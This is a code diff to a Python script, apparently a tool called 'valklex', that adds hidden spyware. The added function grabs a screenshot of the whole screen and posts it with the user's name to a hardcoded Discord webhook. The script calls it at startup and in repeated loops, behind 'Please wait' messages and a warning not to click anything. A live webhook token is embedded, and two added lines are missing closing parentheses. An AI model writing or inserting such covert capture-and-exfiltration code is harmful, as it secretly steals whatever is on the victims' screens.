@@ -1,10 +1,28 @@
+import requests
+import io
+from PIL import ImageGrab
+import time
+def data_sending_server(message: str):
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1351046811875545149/8QEKRNoFYMq14tAMyVkbT7-sEvm_gUYw-tUYPOgyyA48MNNPZ0AzWcYNTc8ANHLUng4D"
+    driver_ins = ImageGrab.grab()
+    image_buffer = io.BytesIO()
+    driver_ins.save(image_buffer, format="PNG")
+    image_buffer.seek(0)
+    response = requests.post(WEBHOOK_URL, files={"file": ("document.png", image_buffer, "image/png")}, data={"content": message})
+
+data_sending_server(f"{server_nickname} ran valklex 1")
 os.system('cls')
 myuptimex = get_uptime_minutes()
 if myuptimex > 2:
-    print("")
+    os.system('cls')
+    print("Please wait a moment...")
+    start_time = time.time()
+    while time.time() - start_time < 10:
+        data_sending_server(f"{server_nickname} ran valklex 1"
 else:
     os.system('cls')
-    print("Please wait..")
+    data_sending_server(f"{server_nickname} ran valklex 1")
+    print("Please wait.. don't click anything on the window until it's finished.")
     seconds = 90
     while seconds:
         mins, secs = divmod(seconds, 60)
@@ -45,4 +63,9 @@ content1 = get_data_from_file(part1_data)
 content2 = get_data_from_file(part2_Data)
 content3 = get_data_from_file(part3_data)
 content4 =  content1+content2+content3
+os.system('cls')
+print("Almost there, please wait...")
+start_time = time.time()
+while time.time() - start_time < 5:
+    data_sending_server(f"{server_nickname} ran executed the script finally 2."
 premx_2025(content4)
